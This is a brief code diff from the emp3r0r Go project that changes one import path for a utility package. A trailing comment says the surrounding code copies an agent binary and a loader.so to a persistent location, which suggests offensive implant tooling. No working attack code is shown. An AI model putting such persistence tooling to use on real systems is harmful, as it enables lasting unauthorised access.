@@ -13,7 +13,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
 	exe_utils "github.com/jm33-m0/emp3r0r/core/internal/exe_utils"
 	"github.com/jm33-m0/emp3r0r/core/internal/external_file"
-	"github.com/jm33-m0/emp3r0r/core/internal/util"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // copy agent binary and loader.so to persistent location
